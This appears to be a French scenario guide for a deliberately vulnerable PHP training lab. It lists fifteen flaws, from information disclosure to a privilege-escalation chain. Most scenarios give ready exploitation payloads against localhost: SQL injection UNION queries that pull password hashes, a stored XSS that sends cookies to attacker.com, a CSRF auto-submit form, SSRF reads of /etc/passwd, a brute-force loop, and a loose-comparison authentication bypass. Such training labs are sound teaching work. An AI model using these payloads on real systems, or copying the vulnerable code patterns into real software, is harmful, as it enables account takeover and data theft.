# ICS Community — 15 Scénarios de Vulnérabilités

> **LABORATOIRE DE FORMATION — DONNÉES FICTIVES — NE PAS EXPOSER SUR INTERNET**

## Vue d'ensemble

| # | Vulnérabilité | Sévérité | Fichier principal | Endpoint |
|---|---------------|----------|-------------------|----------|
| 1 | Information Disclosure | Faible | `index.php` | `GET /api/debug/session` |
| 2 | Account Enumeration | Faible | `auth.php` | `POST /register` |
| 3 | Brute Force Login | Faible | `auth.php` | `POST /login` |
| 4 | Broken Access Control (Admin) | Moyen | `index.php` | `GET /admin` |
| 5 | IDOR / BOLA (User API) | Moyen | `index.php` | `GET /api/users/{id}` |
| 6 | SQL Injection (Search) | Critique | `index.php` | `GET /api/search?q=` |
| 7 | Stored XSS (Posts) | Élevé | `PostController.php` | `POST /api/posts` |
| 8 | CSRF Faible | Moyen | `auth.php` | Tous les formulaires |
| 9 | Session Management | Moyen | `auth.php` | `POST /login` |
| 10 | Mass Assignment | Élevé | `ProfileController.php` | `POST /api/profile` |
| 11 | Business Logic (Donations) | Élevé | `DonationController.php` | `POST /api/donations` |
| 12 | Privilege Escalation | Critique | `RoleRequestController.php` | `POST /api/request-role` |
| 13 | SSRF | Élevé | `FetchUrlController.php` | `GET /api/fetch-url?url=` |
| 14 | Vulnérabilités Chaînées | Critique | `ExportController.php` | `GET /api/export/{id}` |
| 15 | Simulation CVE PHP 2026 | Critique | *Conteneur isolé* | Voir section dédiée |

---

## Scénario 1 : Information Disclosure (Faible)

**Fichier :** `app/public/index.php` — route `api/debug/session`

**Description :** Un endpoint de debug non protégé expose les données de session, la version PHP, le chemin du serveur et les cookies.

**Exploitation :**
```
GET /api/debug/session
```

**Impact :** Fuite du `session_id`, du token CSRF (prévisible car basé sur `md5(time())`), de la version PHP et de la configuration serveur.

**Indices pour l'étudiant :**
- Explorer les endpoints `/api/` avec un outil de fuzzing
- Chercher des endpoints de debug courants : `/debug`, `/api/debug`, `/api/status`

---

## Scénario 2 : Account Enumeration (Faible)

**Fichier :** `app/src/Auth/auth.php` — fonction `registerUser()`

**Description :** Le formulaire d'inscription retourne un message différent selon que l'email ou le username existe déjà, ce qui permet d'énumérer les comptes.

**Exploitation :**
```
POST /register
username=admin&email=test@test.com → "Ce nom d'utilisateur est déjà pris"
username=test123&email=volkoff@ics-lab.ci → "Cet email est déjà utilisé"
```

**Impact :** Un attaquant peut vérifier si un email ou un username existe dans la base.

---

## Scénario 3 : Brute Force Login (Faible)

**Fichier :** `app/src/Auth/auth.php` — fonction `loginUser()`

**Description :** Pas de limitation du nombre de tentatives de connexion. Pas de captcha, pas de délai, pas de blocage temporaire.

**Exploitation :**
```bash
# Avec Burp Intruder ou hydra
for pass in $(cat wordlist.txt); do
  curl -X POST http://localhost:8080/login \
    -d "email=volkoff@ics-lab.ci&password=$pass"
done
```

**Mots de passe :** uniques par compte, non publiés (objectif : les retrouver par brute force sur une wordlist).

---

## Scénario 4 : Broken Access Control — Admin (Moyen)

**Fichier :** `app/public/index.php` — routes `admin/*`

**Description :** Les pages admin vérifient uniquement `requireLogin()` — n'importe quel utilisateur connecté peut accéder au dashboard admin. Le champ `is_admin` en base n'est pas vérifié.

**Exploitation :**
```
# Se connecter avec n'importe quel compte membre puis naviguer vers :
GET /admin
GET /admin/users
GET /admin/logs
```

---

## Scénario 5 : IDOR / BOLA (Moyen)

**Fichier :** `app/public/index.php` — route `api/users/{id}`

**Description :** L'API retourne les informations complètes de n'importe quel utilisateur (email, téléphone, rôle, `is_admin`, dernière connexion) sans vérifier les droits.

**Exploitation :**
```
GET /api/users/1
GET /api/users/2
...
GET /api/users/12
```

**Impact :** Fuite d'informations personnelles, du champ `is_admin`, et du statut de chaque compte.

---

## Scénario 6 : SQL Injection (Critique)

**Fichier :** `app/public/index.php` — route `api/search`

**Description :** Le paramètre `q` est concaténé directement dans la requête SQL sans préparation.

**Exploitation :**
```
# Extraction de version
GET /api/search?q=' UNION SELECT 1,version(),3,4-- -

# Extraction des mots de passe hashés
GET /api/search?q=' UNION SELECT id,username,password_hash,email FROM users-- -

# Extraction des tables
GET /api/search?q=' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

---

## Scénario 7 : Stored XSS (Élevé)

**Fichier :** `app/src/Controllers/PostController.php` + `app/templates/feed.php`

**Description :** Le contenu des posts n'est pas échappé côté serveur. Dans le template, `nl2br()` est utilisé sans `htmlspecialchars()`.

**Exploitation :**
```
POST /api/posts
content=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
visibility=public
```

**Impact :** Vol de cookies de session de tous les utilisateurs qui consultent le feed.

---

## Scénario 8 : CSRF Faible (Moyen)

**Fichier :** `app/src/Auth/auth.php` — fonctions `csrfToken()` et `verifyCsrf()`

**Description :** Le token CSRF est généré avec `md5(time())`, ce qui le rend prévisible (la précision est à la seconde). De plus, le contrôleur de messages (`MessageController.php`) ne vérifie pas du tout le token CSRF.

**Exploitation :**
```html
<!-- Page malveillante qui envoie un message au nom de la victime -->
<form action="http://localhost:8080/api/messages" method="POST" id="csrf-form">
  <input type="hidden" name="receiver_id" value="1">
  <input type="hidden" name="content" value="Message forgé par l'attaquant">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

---

## Scénario 9 : Session Management (Moyen)

**Fichier :** `app/src/Auth/auth.php` — fonction `loginUser()`

**Description :** Le session ID n'est pas régénéré après connexion (`session_regenerate_id()` est absent). Cela permet une attaque de fixation de session.

**Exploitation :**
1. L'attaquant obtient un session ID (visite le site)
2. L'attaquant force la victime à utiliser ce session ID (via un lien ou un cookie)
3. La victime se connecte avec ce session ID
4. L'attaquant utilise le même session ID pour accéder au compte de la victime

---

## Scénario 10 : Mass Assignment (Élevé)

**Fichier :** `app/src/Controllers/ProfileController.php`

**Description :** Le contrôleur de profil accepte TOUS les champs POST et les insère dans la requête UPDATE SQL. Les champs `role`, `is_admin` et `status` ne sont pas filtrés.

**Exploitation :**
```bash
curl -X POST http://localhost:8080/api/profile \
  -b "PHPSESSID=xxx" \
  -d "display_name=Hacker&role=president&is_admin=1&csrf_token=xxx"
```

**Impact :** Un utilisateur peut se promouvoir au rôle de président et s'octroyer les droits admin.

---

## Scénario 11 : Business Logic — Donations (Élevé)

**Fichier :** `app/src/Controllers/DonationController.php`

**Description :** Pas de validation du montant côté serveur. Les montants négatifs sont acceptés, et le montant est concaténé directement dans l'UPDATE SQL du total.

**Exploitation :**
```bash
# Don négatif — réduit le total collecté
curl -X POST http://localhost:8080/api/donations \
  -d "donor_name=Hacker&amount=-50000000&payment_method=wave"

# Injection SQL dans le montant (via le UPDATE non préparé)
curl -X POST http://localhost:8080/api/donations \
  -d "donor_name=Hacker&amount=0, setting_key='hacked' WHERE 1=1-- -&payment_method=wave"
```

---

## Scénario 12 : Privilege Escalation (Critique)

**Fichier :** `app/src/Controllers/RoleRequestController.php`

**Description :** L'API de changement de rôle applique directement le rôle demandé sans workflow d'approbation. N'importe quel membre peut se promouvoir.

**Exploitation :**
```bash
curl -X POST http://localhost:8080/api/request-role \
  -b "PHPSESSID=xxx" \
  -d "role=president&reason=test"
```

**Impact :** Prise de contrôle totale de la plateforme.

---

## Scénario 13 : SSRF (Élevé)

**Fichier :** `app/src/Controllers/FetchUrlController.php`

**Description :** L'API proxy permet de spécifier n'importe quelle URL, y compris des adresses internes du réseau Docker.

**Exploitation :**
```
# Scanner les services internes Docker
GET /api/fetch-url?url=http://db:3306
GET /api/fetch-url?url=http://mailpit:8025

# Lire des fichiers locaux
GET /api/fetch-url?url=file:///etc/passwd
GET /api/fetch-url?url=file:///var/www/html/../config/database.php

# Scanner le réseau interne
GET /api/fetch-url?url=http://172.18.0.1:80
```

---

## Scénario 14 : Vulnérabilités Chaînées (Critique)

**Fichier :** `app/src/Controllers/ExportController.php`

**Description :** Combine plusieurs vulnérabilités en une chaîne d'attaque :

**Chaîne d'exploitation :**
1. **Information Disclosure** (`/api/debug/session`) → obtenir la version PHP et le CSRF token
2. **Account Enumeration** (`/register`) → identifier des comptes cibles
3. **IDOR** (`/api/export/{id}`) → exporter les données complètes d'un utilisateur (y compris `password_hash`, sessions actives, messages privés)
4. **Mass Assignment** (`/api/profile`) → se promouvoir admin
5. **Accès admin** (`/admin`) → contrôle total de la plateforme

**Exploitation de l'export :**
```
# Exporter les données de l'utilisateur 1 (sans être cet utilisateur)
GET /api/export/1

# Le résultat contient : password_hash, messages privés, sessions actives, donations
```

---

## Scénario 15 : Simulation CVE PHP 2026 (Critique)

**Description :** Simulation pédagogique d'une vulnérabilité de type CVE affectant PHP (type confusion dans `json_decode` conduisant à un bypass d'authentification).

**⚠️ Ce scénario doit être implémenté dans un conteneur Docker isolé :**
- Pas de montage du système hôte
- Pas de socket Docker
- Pas de données réelles
- Pas de réseau sortant

**Implémentation suggérée :** Ajouter un service `vuln-cve` dans `docker-compose.yml` :

```yaml
vuln-cve:
  build:
    context: ./cve-simulation
    dockerfile: Dockerfile
  ports:
    - "8081:80"
  networks:
    - ics-internal
  # Pas d'accès Internet, pas de volumes sensibles
```

**Scénario :** Un endpoint d'authentification utilise `json_decode()` avec une comparaison lâche (`==`) qui permet de contourner la vérification du mot de passe en envoyant un type inattendu.

```php
// Code vulnérable simulé
$data = json_decode(file_get_contents('php://input'));
if ($data->password == $storedHash) { // Comparaison lâche !
    $_SESSION['admin'] = true;
}
```

**Exploitation :** Envoyer `{"username":"admin","password":true}` — la comparaison `true == "string"` retourne toujours `true` en PHP.

---

## Comptes de test

Chaque compte a un mot de passe unique. Les mots de passe ne sont pas publiés dans le dépôt : ils sont fournis au formateur séparément.

| Pseudo | Email | Rôle |
|--------|-------|------|
| thesocvolkoff | volkoff@ics-lab.ci | president |
| massambacyberhack | massamba@ics-lab.ci | administrateur |
| camson | camson@ics-lab.ci | moderateur |
| mrshadow | shadow@ics-lab.ci | moderateur |
| legoatdeshacker | goathacker@ics-lab.ci | moderateur |
| victoriait | victoria@ics-lab.ci | moderateur |
| hassancamara | hassan@ics-lab.ci | membre |
| tehuayann | tehua@ics-lab.ci | membre |
| hackerman | hackerman@ics-lab.ci | membre |
| ahizimarc | ahizi@ics-lab.ci | membre |
| gnalyemmanuel | gnaly@ics-lab.ci | membre |
| dombamohamed | domba@ics-lab.ci | membre |
| neloumgrace | neloum@ics-lab.ci | membre |
| yohananfredo | yohanan@ics-lab.ci | membre |

---

## Outils recommandés

- **Burp Suite Community** : proxy d'interception, Intruder, Repeater
- **OWASP ZAP** : scanner automatisé
- **curl / httpie** : tests manuels en ligne de commande
- **SQLMap** : exploitation automatisée de l'injection SQL
- **Browser DevTools** : modification des requêtes, inspection des cookies
